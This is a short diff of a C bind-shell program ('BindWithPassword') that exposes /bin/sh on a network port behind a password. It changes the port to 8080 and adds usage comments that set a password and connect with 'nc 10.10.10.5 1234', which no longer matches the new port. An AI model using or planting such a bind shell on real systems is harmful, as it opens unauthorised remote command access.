@@ -8,13 +8,19 @@
 #include <arpa/inet.h>
 #include <errno.h>
 
-#define PORT 1234
+#define PORT 8080
 #define BACKLOG 3
 #define BUFFER_SIZE 1024
 #define PASSWD_LENGTH 8
 #define SHELL_PATH "/bin/sh"
 
 //gcc -o BindWithPassword BindWithPassword.c
+
+//export PW=abcd1234
+//./BindWithPassword
+
+//nc 10.10.10.5 1234
+
 
 // Constant-time string comparison to avoid timing attacks
 int secure_compare(const char *a, const char *b, size_t len) {
